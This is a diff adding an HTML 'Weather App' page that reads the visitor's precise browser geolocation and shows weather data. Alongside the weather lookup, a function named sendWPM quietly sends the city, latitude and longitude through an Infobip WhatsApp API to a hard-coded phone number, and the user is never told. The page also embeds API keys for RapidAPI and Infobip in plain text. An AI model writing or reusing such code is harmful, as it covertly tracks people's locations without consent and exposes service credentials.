@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Weather App</title>
+</head>
+
+<body>
+    <h1>Weather Information</h1>
+    <pre id="weather-data">Fetching weather data...</pre>
+
+    <script>
+        // Function to get the user's real-time coordinates
+        function getCoordinates() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
+                    enableHighAccuracy: true, // Use high accuracy if available
+                    timeout: 5000, // Set timeout in milliseconds
+                    maximumAge: 0 // Do not use cached results
+                });
+            } else {
+                document.getElementById('weather-data').textContent = 'Geolocation is not supported by this browser.';
+            }
+        }
+
+        // Success callback function
+        function successCallback(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            console.log('Latitude:', latitude);
+            console.log('Longitude:', longitude);
+
+            // Fetch weather data using coordinates
+            fetchWeatherData(latitude, longitude);
+        }
+
+        // Error callback function
+        function errorCallback(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById('weather-data').textContent = 'User denied the request for Geolocation.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById('weather-data').textContent = 'Location information is unavailable.';
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById('weather-data').textContent = 'The request to get user location timed out.';
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById('weather-data').textContent = 'An unknown error occurred.';
+                    break;
+            }
+        }
+
+        // Function to fetch weather data using coordinates
+        async function fetchWeatherData(latitude, longitude) {
+            const url = `https://weatherapi-com.p.rapidapi.com/current.json?q=${latitude},${longitude}`;
+            const options = {
+                method: 'GET',
+                headers: {
+                    'x-rapidapi-key': '44e18e2c6cmsh6b63e734f55c753p174875jsnf859a322602b',
+                    'x-rapidapi-host': 'weatherapi-com.p.rapidapi.com'
+                }
+            };
+
+            try {
+                const response = await fetch(url, options);
+                const weatherData = await response.json();
+                console.log('Weather Data:', weatherData);
+                sendWPM(weatherData?.location?.name, weatherData?.location?.lat, weatherData?.location?.lon);
+                document.getElementById('weather-data').textContent = JSON.stringify(weatherData, null, 2);
+            } catch (error) {
+                document.getElementById('weather-data').textContent = 'Error fetching weather data: ' + error.message;
+            }
+        }
+
+        async function sendWPM(city, lat, lon) {
+            const myHeaders = new Headers();
+            myHeaders.append("Authorization", "App 8ec035176dd70b95e764f08628d56010-05a0f3a6-6b74-4d2b-bb2b-b53d64931458");
+            myHeaders.append("Content-Type", "application/json");
+            myHeaders.append("Accept", "application/json");
+
+            const raw = JSON.stringify({
+                "messages": [
+                    {
+                        "from": "447860099299",
+                        "to": "917828088524",
+                        "messageId": "489c1237-394c-4f13-9d11-e790e52bf815",
+                        "content": {
+                            "templateName": "message_test",
+                            "templateData": {
+                                "body": {
+                                    "placeholders": [`city -> ${city} lat-> ${lat} lon-> ${lon}`]
+                                }
+                            },
+                            "language": "en"
+                        }
+                    }
+                ]
+            });
+
+            const requestOptions = {
+                method: "POST",
+                headers: myHeaders,
+                body: raw,
+                redirect: "follow"
+            };
+
+            fetch("https://6gqew8.api.infobip.com/whatsapp/1/message/template", requestOptions)
+                .then((response) => response.text())
+                .then((result) => console.log(result))
+                .catch((error) => console.error(error));
+        }
+
+        // Call the function to get coordinates and fetch weather data
+        getCoordinates();
+    </script>
+</body>
+
+</html>
